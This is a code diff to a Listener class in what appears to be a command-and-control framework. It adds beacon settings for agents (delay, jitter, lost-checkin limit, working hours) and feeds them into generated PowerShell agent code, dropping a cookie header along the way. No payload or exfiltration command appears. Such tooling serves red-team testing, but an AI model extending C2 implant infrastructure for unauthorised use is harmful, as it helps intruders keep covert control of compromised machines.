@@ -62,6 +62,26 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'DefaultDelay' : {
+                'Description'   :   'Agent delay/reach back interval (in seconds).',
+                'Required'      :   True,
+                'Value'         :   5
+            },
+            'DefaultJitter' : {
+                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
+                'Required'      :   True,
+                'Value'         :   0.0
+            },
+            'DefaultLostLimit' : {
+                'Description'   :   'Number of missed checkins before exiting',
+                'Required'      :   True,
+                'Value'         :   60
+            },
+            'WorkingHours' : {
+                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
             'DefaultProfile' : {
                 'Description'   :   'Default communication profile for the agent, extracted from RedirectListener automatically.',
                 'Required'      :   False,
@@ -93,9 +113,6 @@ class Listener:
         # required:
         self.mainMenu = mainMenu
         self.threads = {}
-
-        # optional/specific for this module
-
 
     def default_response(self):
         """
@@ -359,6 +376,12 @@ class Listener:
 
         This is so agents can easily be dynamically updated for the new listener.
         """
+        delay = listenerOptions['DefaultDelay']['Value']
+        jitter = listenerOptions['DefaultJitter']['Value']
+        profile = listenerOptions['DefaultProfile']['Value']
+        lostLimit = listenerOptions['DefaultLostLimit']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
+        b64DefaultResponse = base64.b64encode(self.default_response())
 
         #we are generating code for an already deployed agent
         deployed = "deployed" in kwargs
@@ -372,8 +395,7 @@ class Listener:
     jitter = {jitter}
     profile= "{profile}"
     fixed_parameters= @{{
-        headers = @{{UserAgent= "{UA}"
-                     Cookie="{cookie}"}}
+        headers = @{{UserAgent= "{UA}"}}
         taskURIs = "{taskURIs}"
         }}
     send_func= $script:{send_func}
